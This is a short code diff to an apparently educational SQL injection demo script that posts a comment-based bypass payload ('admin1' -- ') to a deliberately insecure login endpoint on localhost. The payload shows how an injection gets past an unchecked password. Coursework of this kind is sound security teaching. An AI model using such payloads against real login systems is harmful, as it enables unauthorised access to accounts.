@@ -18,10 +18,7 @@ LOGIN_URL = "http://127.0.0.1:5000/login?format=json"
 def main():
     # This payload is crafted for the intentionally insecure login query in the
     # coursework app, where user input is concatenated directly into SQL.
-    payload = {
-        "username": "admin' -- ",
-        "password": "does-not-matter",
-    }
+    payload = {"username": "admin1' -- ", "password": "does-not-matter"}
 
     print("SQL Injection Demo")
     print(f"Target: {LOGIN_URL}")
@@ -56,4 +53,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
